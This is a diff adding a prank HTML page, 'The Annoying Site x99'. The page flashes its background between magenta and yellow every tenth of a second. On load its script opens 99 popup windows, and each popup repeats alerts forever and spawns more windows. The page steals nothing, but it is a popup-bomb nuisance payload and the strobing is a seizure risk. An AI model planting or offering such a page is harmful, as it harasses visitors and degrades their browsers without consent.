@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>The Annoying Site x99</title>
+  <style>
+    body {
+      background: magenta;
+      font-family: "Comic Sans MS", cursive;
+      text-align: center;
+      animation: blink 0.1s infinite alternate;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 60px;
+      color: yellow;
+      margin-top: 25vh;
+      text-shadow: 2px 2px red;
+      animation: shake 0.2s infinite alternate;
+    }
+
+    @keyframes blink {
+      0% { background-color: magenta; }
+      100% { background-color: yellow; }
+    }
+
+    @keyframes shake {
+      from { transform: rotate(-2deg); }
+      to { transform: rotate(2deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>😈 Welcome to ANNOYING HELL! 😈</h1>
+
+  <script>
+    function openPopup(x, y) {
+      const popup = window.open("", "", `width=300,height=300,left=${x},top=${y}`);
+      if (popup) {
+        popup.document.write(`
+          <html>
+          <head><title>LOL!</title></head>
+          <body style="background-color: lime; font-family: 'Comic Sans MS'; text-align: center;">
+            <h1 style="color: red; font-size: 40px;">😂 You clicked it!</h1>
+            <script>
+              setInterval(() => {
+                alert('Still here? 🤪');
+              }, 4000);
+
+              setTimeout(() => {
+                const nx = Math.random() * screen.width;
+                const ny = Math.random() * screen.height;
+                window.open('', '', 'width=300,height=300,left=' + nx + ',top=' + ny);
+              }, 3000);
+            <\/script>
+          </body>
+          </html>
+        `);
+      }
+    }
+
+    function open99Popups() {
+      for (let i = 0; i < 99; i++) {
+        const x = Math.random() * screen.width;
+        const y = Math.random() * screen.height;
+        setTimeout(() => openPopup(x, y), i * 50); // kis késleltetés, hogy ne blokkolja mindet
+      }
+    }
+
+    setTimeout(open99Popups, 1000); // Indul 1 másodperc múlva
+  </script>
+</body>
+</html>
